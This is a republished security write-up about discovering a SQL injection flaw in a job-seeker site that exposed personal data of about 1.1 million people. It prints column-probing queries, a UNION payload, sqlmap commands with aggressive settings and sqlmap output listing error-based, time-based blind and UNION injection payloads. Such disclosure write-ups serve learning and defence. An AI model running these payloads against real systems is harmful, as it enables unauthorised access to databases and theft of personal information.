# :game_die: SQL Injection: How I secured Personal Information (PII) of 1.1M Job Seekers

> **Original Source:** [SQL Injection: How I secured Personal Information (PII) of 1.1M Job Seekers](https://infosecwriteups.com/sql-injection-how-i-secured-personal-information-pii-of-1-1m-job-seekers-7f7c55d11fbc)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

The next thing is to find the number of columns and query the database type and version.


For Finding the columns:

>

`*ORDER BY 1*`


`*ORDER BY 2*`


`*ORDER BY 3*` and so on


For querying the database:


```
' UNION SELECT @@version--
```


To automate the process I have used [sqlmap](https://github.com/sqlmapproject/sqlmap).


## Get brutexploiter’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


[sqlmap](https://github.com/sqlmapproject/sqlmap) is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

### sqlmap command:


```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3
```


### sqlmap result:


```
Parameter: id (GET)
Type: error-based
Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
Payload: id=test' AND EXTRACTVALUE(6427,CONCAT(0x5c,0x716a6a6271,(SELECT (ELT(6427=6427,1))),0x717a767a71)) AND 'zBLQ'='zBLQ
Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
```


```
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: id=test' AND (SELECT 4881 FROM (SELECT(SLEEP(5)))YnXf) AND 'qGsw'='qGsw
Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) Type: UNION query
Title: Generic UNION query (NULL) - 10 columns
Payload: id=test' UNION ALL SELECT CONCAT(0x716a6a6271,0x525a6479634a525071674d6b774a4873775944464259496c6d58585878727246686e6252426a615a,0x717a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
Vector: UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```


```
sqlmap -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs
```

---

*Originally published on [Medium](https://infosecwriteups.com/sql-injection-how-i-secured-personal-information-pii-of-1-1m-job-seekers-7f7c55d11fbc). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
